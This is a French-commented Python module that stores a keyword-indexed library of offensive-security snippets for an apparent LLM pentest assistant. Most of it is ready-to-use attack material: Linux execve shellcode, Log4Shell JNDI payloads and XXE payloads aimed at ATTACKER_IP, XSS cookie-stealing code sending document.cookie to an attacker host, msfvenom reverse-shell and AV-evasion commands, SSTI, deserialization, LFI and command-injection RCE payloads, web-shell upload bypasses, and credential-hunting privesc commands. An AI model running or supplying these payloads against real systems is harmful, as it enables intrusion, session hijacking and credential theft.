"""Bibliothèque de snippets VÉRIFIÉS — codes validés, jamais générés par le LLM.

Chaque snippet a été testé/validé. Le LLM n'intervient PAS ici :
la réponse est locale, instantanée et exacte.
"""
from typing import Dict, List, Optional, Tuple

FENCE = "```"


class SnippetLibrary:
    """Contient les codes vérifiés, indexés par mots-clés."""

    def __init__(self):
        # (mots_clés, titre, contenu, executable_par_le_routeur)
        self._snippets: List[Tuple[List[str], str, str, bool]] = []
        self._charger()

    def _bloc(self, titre: str, lignes: List[str], lang: str = "text") -> str:
        return "\n".join([f"### {titre}", FENCE + lang, *lignes, FENCE, ""])

    def _charger(self):
        # ============ 1. SHELLCODE execve (23 octets, VÉRIFIÉ) ============
        self._snippets.append((
            ["shellcode", "execve", "bin/sh", "code machine", "int 0x80"],
            "Shellcode Linux x86 — execve('/bin/sh')",
            self._bloc("Version classique (23 octets)", [
                "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e",
                "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
            ]) + self._bloc("Variante robuste avec cdq (24 octets)", [
                "\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e",
                "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
            ]) + "**Décomposition :**\n"
            "- `\\x31\\xc0` : xor eax, eax\n"
            "- `\\x50` : push eax (NULL terminateur)\n"
            "- `\\x68\\x2f\\x2f\\x73\\x68` : push '//sh'\n"
            "- `\\x68\\x2f\\x62\\x69\\x6e` : push '/bin'\n"
            "- `\\x89\\xe3` : mov ebx, esp (pointeur argv[0])\n"
            "- `\\x50\\x53\\x89\\xe1` : push NULL, push ebx, mov ecx, esp (argv)\n"
            "- `\\xb0\\x0b` : mov al, 11 (syscall execve)\n"
            "- `\\xcd\\x80` : int 0x80",
            False,
        ))

        # ============ 2. LOG4SHELL (CVE-2021-44228) ============
        self._snippets.append((
            ["log4shell", "log4j", "cve-2021-44228", "jndi"],
            "Log4Shell — CVE-2021-44228",
            self._bloc("Payloads", [
                "${jndi:ldap://ATTACKER_IP:1389/Exploit}",
                "${jndi:rmi://ATTACKER_IP:1099/Exploit}",
                "${jndi:ldap://ATTACKER_IP:1389/Basic/Command/Base64/BASE64_CMD}",
            ], "text") + self._bloc("Chaîne d'exploitation", [
                "1. Démarrer un serveur LDAP malveillant (marshalsec ou JNDI-Exploit-Kit)",
                "2. Démarrer un serveur HTTP qui sert le payload Java (.class)",
                "3. Injecter le payload dans CHAQUE champ loggé : User-Agent, username, Referer...",
                "4. Exemple : curl -H 'User-Agent: ${jndi:ldap://IP:1389/Exploit}' http://cible/",
            ], "text") + self._bloc("Détection", [
                "nmap --script http-log4shell --script-args http-log4shell.root=/cible TARGET",
            ], "bash"),
            False,
        ))

        # ============ 3. XXE ============
        self._snippets.append((
            ["xxe", "entite externe", "xml external", "injection xml"],
            "XXE — XML External Entity",
            self._bloc("Lecture de fichier", [
                '<?xml version="1.0"?>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                "<foo>&xxe;</foo>",
            ], "xml") + self._bloc("Exfiltration HTTP (blind)", [
                '<?xml version="1.0"?>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP:8000/log">]>',
                "<foo>&xxe;</foo>",
            ], "xml") + self._bloc("SSRF — metadata cloud", [
                '<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">',
            ], "xml"),
            False,
        ))

        # ============ 4. XSS (stored/reflected) — payloads VÉRIFIÉS ============
        self._snippets.append((
            ["xss", "cross-site", "vol de session", "stored xss", "reflected xss"],
            "XSS — payloads vérifiés et chaîne d'exploitation",
            self._bloc("1. Sondes d'exécution (non destructives)", [
                "<script>alert(document.domain)</script>",
                "\"><svg onload=fetch('http://ATTACKER:8000/probe')>",
                "<img src=x onerror=alert(1)>",
            ], "html") + self._bloc("2. Vol de cookie — code qui MARCHE", [
                "// Méthode 1 : Image (non soumis au CORS)",
                "new Image().src='http://ATTACKER:8000/steal?c='+encodeURIComponent(document.cookie);",
                "// Méthode 2 : fetch en mode no-cors",
                "fetch('http://ATTACKER:8000/steal?c='+encodeURIComponent(document.cookie),{mode:'no-cors'});",
                "// Payload clé en main (fonctionne aussi en contexte attribut)",
                "<img src=x onerror=\"new Image().src='http://ATTACKER:8000/?c='+document.cookie\">",
            ], "javascript") + self._bloc("3. Vérifier HttpOnly AVANT exploitation", [
                "if (document.cookie) {",
                "    // cookie accessible → vol possible",
                "    new Image().src='http://ATTACKER:8000/?c='+document.cookie;",
                "} else {",
                "    // cookie HttpOnly → document.cookie vide",
                "    // → tester CSRF ou voler les tokens présents dans le DOM",
                "}",
            ], "javascript") + self._bloc("4. Références", [
                "OWASP Testing Guide : WSTG-CLNT-001 (Reflected XSS)",
                "OWASP Testing Guide : WSTG-CLNT-002 (Stored XSS)",
                "CWE-79 — Improper Neutralization of Input During Web Page Generation",
                "MITRE ATT&CK : T1059.007 (JavaScript), T1189 (Drive-by Compromise)",
            ], "text"),
            False,
        ))

        # ============ 5. ESCALADE DE PRIVILÈGES LINUX ============
        self._snippets.append((
            ["escalade", "privesc", "privilege escalation", "suid", "sudo -l"],
            "Checklist d'escalade de privilèges Linux",
            self._bloc("Commandes", [
                "# 1. Identité et droits sudo",
                "id; whoami; sudo -l",
                "# 2. Binaires SUID (classique : python, find, vim, bash...)",
                "find / -perm -4000 -type f 2>/dev/null",
                "# 3. Tâches planifiées (cron) et fichiers associés",
                "ls -la /etc/cron*; cat /etc/crontab",
                "# 4. Secrets dans l'environnement",
                "env | grep -iE 'key|pass|token|secret'",
                "# 5. Historique",
                "history; cat ~/.bash_history",
                "# 6. Version du noyau (chercher un exploit)",
                "uname -a",
                "# 7. Services en écoute",
                "ss -tlnp",
                "# 8. Fichiers world-writable",
                "find / -writable -type f 2>/dev/null | grep -vE 'proc|sys'",
                "# 9. Credentials en clair",
                "grep -r 'password' /etc/ /var/www/ 2>/dev/null | head -20",
            ], "bash"),
            False,
        ))

        # ============ 6. RECON WINDOWS ============
        self._snippets.append((
            ["recon windows", "reconnaissance windows", "whoami /all"],
            "Checklist de reconnaissance Windows",
            self._bloc("Commandes", [
                "whoami /all",
                "net user",
                "net localgroup administrators",
                "systeminfo",
                "ipconfig /all",
                "tasklist /v",
                "schtasks /query /fo LIST",
                "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\"",
                "cmdkey /list",
                "dir /s /b C:\\Users\\*",
                "powershell -c \"Get-Process | Select ProcessName,Path\"",
            ], "powershell"),
            False,
        ))

        # ============ 7. PIVOT / CHISEL ============
        self._snippets.append((
            ["chisel", "pivot", "port forward", "tunnel"],
            "Pivot réseau avec Chisel",
            self._bloc("Côté attaquant (serveur)", [
                "chisel server -p 8080 --reverse",
            ], "bash") + self._bloc("Côté machine compromise (client)", [
                "chisel client ATTACKER_IP:8080 R:8888:127.0.0.1:80",
                "# → sur la machine attaquant : http://127.0.0.1:8888 = port 80 de la cible interne",
            ], "bash"),
            False,
        ))

        # ============ 8. COMMANDES NMAP (fallback routeur) ============
        self._snippets.append((
            [], "Commandes Nmap essentielles",
            self._bloc("Commandes", [
                "# Découverte du réseau",
                "nmap -sn 192.168.1.0/24",
                "# Scan de services + versions + scripts par défaut",
                "nmap -sV -sC TARGET_IP",
                "# Tous les ports TCP",
                "nmap -p- -T4 TARGET_IP",
                "# Scripts de vulnérabilités",
                "nmap --script vuln TARGET_IP",
                "# Scan UDP top 100",
                "nmap -sU --top-ports 100 TARGET_IP",
                "# Scan furtif (fragmentation + IP bidons)",
                "nmap -sS -Pn -f -D RND:10 TARGET_IP",
            ], "bash"),
            True,
        ))

        # ============ 9. COMMANDES HASHCAT ============
        self._snippets.append((
            ["hashcat", "cracker un hash", "crack hash"],
            "Cracker des hashes avec Hashcat",
            self._bloc("Commandes par type de hash", [
                "# MD5        → -m 0",
                "hashcat -m 0 -a 0 hash.txt rockyou.txt",
                "# SHA1       → -m 100",
                "hashcat -m 100 -a 0 hash.txt rockyou.txt",
                "# SHA256     → -m 1400",
                "hashcat -m 1400 -a 0 hash.txt rockyou.txt",
                "# NTLM       → -m 1000",
                "hashcat -m 1000 -a 0 hash.txt rockyou.txt",
                "# bcrypt     → -m 3200",
                "hashcat -m 3200 -a 0 hash.txt rockyou.txt",
                "# WPA2       → -m 22000 (handshake converti en .hc22000)",
                "hashcat -m 22000 handshake.hc22000 rockyou.txt",
                "# Attaque par masque (8 chiffres)",
                "hashcat -m 0 -a 3 hash.txt '?d?d?d?d?d?d?d?d'",
            ], "bash"),
            True,
        ))

        # ============ 10. COMMANDES MSFVENOM ============
        self._snippets.append((
            ["msfvenom", "generer un payload", "générer un payload"],
            "Générer des payloads avec MSFVenom",
            self._bloc("Commandes", [
                "# Windows (exe)",
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe",
                "# Linux (elf)",
                "msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf",
                "# PHP",
                "msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php",
                "# Java (war pour Tomcat)",
                "msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war",
                "# Encodage XOR x10 (bypass AV basique)",
                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x64/xor -i 10 -f exe -o shell_enc.exe",
                "# Récupérer le shellcode BRUT (pour tes exploits)",
                "msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f python",
            ], "bash"),
            True,
        ))

        # ============ 11. SQLMAP / WAF BYPASS ============
        self._snippets.append((
            ["waf bypass", "tamper", "contourner un waf"],
            "Bypass WAF avec sqlmap (tamper scripts)",
            self._bloc("Commandes", [
                "# Injection classique",
                "sqlmap -u \"http://TARGET/page.php?id=1\" --batch",
                "# Bypass WAF",
                "sqlmap -u \"http://TARGET/page.php?id=1\" --tamper=space2comment --random-agent --batch",
                "sqlmap -u \"URL\" --tamper=charencode --batch",
                "sqlmap -u \"URL\" --tamper=between --batch",
                "sqlmap -u \"URL\" --tamper=base64encode --batch",
                "# Extraction",
                "sqlmap -u \"URL\" --dbs",
                "sqlmap -u \"URL\" -D nom_base --tables",
                "sqlmap -u \"URL\" -D nom_base -T users --dump",
                "# Shell système (si privilèges élevés)",
                "sqlmap -u \"URL\" --os-shell",
            ], "bash"),
            True,
        ))
    # ============ 12. SSTI (Server-Side Template Injection) ============
        self._snippets.append((
            ["ssti", "template injection", "jinja2", "twig", "freemarker"],
            "SSTI — Server-Side Template Injection",
            self._bloc("1. Détection (identifier le moteur)", [
                "{{7*7}}          → 49 si Jinja2/Twig",
                "${7*7}           → 49 si Freemarker/Velocity",
                "<%= 7*7 %>       → 49 si ERB (Ruby)",
                "#{7*7}           → 49 si Thymeleaf",
            ], "text") + self._bloc("2. RCE — Jinja2 (Flask)", [
                "{{7*'7'}}        # '7777777' = Jinja2 confirmé",
                "{{config}}       # fuite de config",
                "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
                "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
            ], "text") + self._bloc("3. RCE — Twig (PHP)", [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}",
                "{{_self.env.getFilter('id')}}",
            ], "text") + self._bloc("4. RCE — Freemarker (Java)", [
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            ], "text") + self._bloc("5. Références", [
                "PayloadsAllTheThings : SSTI",
                "HackTricks : SSTI (Jinja2, Twig, Freemarker)",
            ], "text"),
            False,
        ))

        # ============ 13. LFI / RFI ============
        self._snippets.append((
            ["lfi", "rfi", "local file", "remote file", "path traversal", "traversée de répertoire"],
            "LFI/RFI — Local & Remote File Inclusion",
            self._bloc("1. Traversée de chemin", [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd   # double encodage",
            ], "text") + self._bloc("2. Wrappers PHP", [
                "php://filter/convert.base64-encode/resource=index.php   # lecture sans exécution",
                "php://filter/convert.base64-encode/resource=config.php",
                "php://input + POST <?php system('id'); ?>               # RCE si allow_url_include=On",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+   # RCE",
                "expect://id                                              # RCE (si extension expect)",
            ], "text") + self._bloc("3. Log poisoning (RCE)", [
                "# 1. Injecter le payload dans le User-Agent",
                "curl -A '<?php system($_GET[cmd]); ?>' http://TARGET/",
                "# 2. Inclure le log",
                "http://TARGET/index.php?page=/var/log/apache2/access.log&cmd=id",
            ], "bash") + self._bloc("4. Références", [
                "OWASP : Path Traversal (WSTG-ATH-01)",
                "CWE-22 / CWE-98",
                "PayloadsAllTheThings : File Inclusion",
            ], "text"),
            False,
        ))

        # ============ 14. DÉSÉRIALISATION ============
        self._snippets.append((
            ["deserialisation", "désérialisation", "ysoserial", "pickle", "phpggc", "object injection"],
            "Désérialisation — PHP, Java, Python",
            self._bloc("1. PHP — Object Injection (gadget)", [
                "O:8:\"stdClass\":1:{s:4:\"cmd\";s:2:\"id\";}",
                "# Utiliser phpggc pour les gadgets réels (laravel, symfony, wordpress...)",
                "phpggc -l | grep -i rce",
                "phpggc Laravel/RCE1 system 'id' -b",
            ], "text") + self._bloc("2. Java — ysoserial", [
                "java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0",
                "java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0",
                "# Envoyer le base64 dans le champ 'serialized' / cookie / corps",
            ], "bash") + self._bloc("3. Python — pickle", [
                "import pickle, os",
                "class RCE:",
                "    def __reduce__(self):",
                "        return (os.system, ('id',))",
                "print(pickle.dumps(RCE()).hex())",
            ], "python") + self._bloc("4. Où chercher (détection)", [
                "Cookies base64 : value=O:... / rO0AB... / gASV...",
                "Champs JSON avec @type (Jackson) : {\"@type\":\"...\"}",
                "Paramètres 'data', 'serialized', 'payload'",
            ], "text"),
            False,
        ))

        # ============ 15. INJECTION DE COMMANDES ============
        self._snippets.append((
            ["command injection", "injection de commande", "os command", "rce commande"],
            "Injection de commandes OS",
            self._bloc("1. Payloads de détection", [
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "& id",
                "|| id",
                "'; whoami",
                "\" | whoami",
            ], "text") + self._bloc("2. Blind (sans retour)", [
                "; sleep 5",
                "| ping -c 5 127.0.0.1",
                "$(sleep 5)",
                "# Vérifier avec un serveur :",
                "| nslookup ATTACKER_IP",
                "| curl http://ATTACKER:8000/$(whoami)",
            ], "bash") + self._bloc("3. Contournement de filtres", [
                "# Sans espace",
                "cat${IFS}/etc/passwd",
                "cat$IFS$9/etc/passwd",
                "# Encodage",
                "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
                "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
            ], "bash") + self._bloc("4. Références", [
                "OWASP : Command Injection (WSTG-INPV-12)",
                "CWE-77 / CWE-78",
                "PayloadsAllTheThings : Command Injection",
            ], "text"),
            False,
        ))

        # ============ 16. SSRF ============
        self._snippets.append((
            ["ssrf", "server side request", "169.254.169.254"],
            "SSRF — Server-Side Request Forgery",
            self._bloc("1. Cibles classiques", [
                "http://127.0.0.1:8080/admin",
                "http://localhost:80/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/meta-data/ (AWS)",
                "file:///etc/passwd   (si schéma file supporté)",
                "gopher://127.0.0.1:6379/_INFO   (attaquer Redis interne)",
            ], "text") + self._bloc("2. Bypass de filtres", [
                "# Redirections",
                "http://127.0.0.1 -> via un redirecteur",
                "# DNS rebinding",
                "1.1.1.1.nip.io",
                "# Encodage de l'IP",
                "http://2130706433/   (127.0.0.1 en décimal)",
                "http://0x7f000001/   (hexadécimal)",
                "http://[::1]:8080/",
                "# @ dans l'URL",
                "http://google.com@127.0.0.1/",
            ], "text") + self._bloc("3. Exfiltration blind", [
                "Interactsh : https://interactsh.com (génère un domaine, reçoit les requêtes DNS/HTTP)",
                "Burp Collaborator : onglet Burp → Collaborator client",
            ], "text") + self._bloc("4. Références", [
                "OWASP : SSRF",
                "CWE-918",
                "HackTricks : SSRF",
            ], "text"),
            False,
        ))

        # ============ 17. UPLOAD DE FICHIER (bypass) ============
        self._snippets.append((
            ["upload", "téléversement", "téléchargement de fichier", "bypass upload"],
            "Upload de fichier — techniques de bypass",
            self._bloc("1. Extensions alternatives (PHP)", [
                "shell.php5 / .phtml / .pht / .phar",
                "shell.php.jpg (double extension — si le parseur Apache traite .php)",
                "shell.php%00.jpg (null byte — anciennes versions)",
                "shell.php. (point final — trim sur certains serveurs)",
                "shell.php::$DATA (NTFS ADS — Windows/IIS)",
            ], "text") + self._bloc("2. Contournement MIME / magic bytes", [
                "# Modifier le Content-Type",
                "Content-Type: image/png",
                "# Ajouter des magic bytes",
                "GIF89a<?php system($_GET[cmd]); ?>",
                "# Récupérer une vraie image puis y coller le payload",
            ], "bash") + self._bloc("3. Post-exploitation", [
                "# Localiser le fichier uploadé",
                "http://TARGET/uploads/shell.php?cmd=id",
                "# Trouver le dossier d'upload : /uploads, /files, /images, /media",
                "feroxbuster -u http://TARGET -w wordlist.txt",
            ], "bash") + self._bloc("4. Références", [
                "OWASP : File Upload (WSTG-BUSL-07 / WSTG-ATH-02)",
                "PayloadsAllTheThings : Upload Insecure Files",
            ], "text"),
            False,
        ))

        # ============ 18. CVSS v3.1 — vecteurs de référence ============
        self._snippets.append((
            ["cvss", "score cvss", "vecteur", "calculer un score"],
            "CVSS v3.1 — notation et exemples de référence",
            self._bloc("1. Notation", [
                "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
                "AV  = vecteur d'attaque (N réseau / L local / A adjacent / P physique)",
                "AC  = complexité (L faible / H élevée)",
                "PR  = privilèges requis (N aucun / L faible / H élevé)",
                "UI  = interaction utilisateur (N aucune / R requise)",
                "S   = portée (U inchangée / C changée)",
                "C/I/A = impact Confidentialité / Intégrité / Disponibilité (N/L/H)",
            ], "text") + self._bloc("2. Vecteurs de référence (vérifiés)", [
                "XSS reflété          : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N → 6.1",
                "XSS stocké (admin)   : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N → 8.7",
                "SQLi (auth bypass)   : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8",
                "RCE Log4Shell        : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0",
                "DoS (SYN flood)      : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H → 7.5",
            ], "text") + self._bloc("3. Règles", [
                "Un score SANS vecteur est une estimation, pas une évaluation.",
                "Toujours justifier : le score final dépend du contexte réel (HttpOnly, exposition, portée...).",
                "Calcul officiel : https://www.first.org/cvss/calculator/3.1",
            ], "text"),
            False,
        ))
    # ---------- API ----------
    def match(self, prompt: str) -> Optional[str]:
        """Cherche un snippet par mots-clés (ignore ceux gérés par le routeur)."""
        p = prompt.lower()
        for mots, titre, contenu, executable in self._snippets:
            if executable:
                continue  # géré par le routeur (exécution réelle d'outils)
            if any(mot in p for mot in mots):
                return f"## 📚 {titre}\n\n{contenu}"
        return None

    def get(self, cle: str) -> Optional[str]:
        """Accès direct par mots-clés (pour les fallbacks du routeur)."""
        p = cle.lower()
        for mots, titre, contenu, _ in self._snippets:
            if mots and any(mot in p for mot in mots):
                return f"## 📚 {titre}\n\n{contenu}"
        return None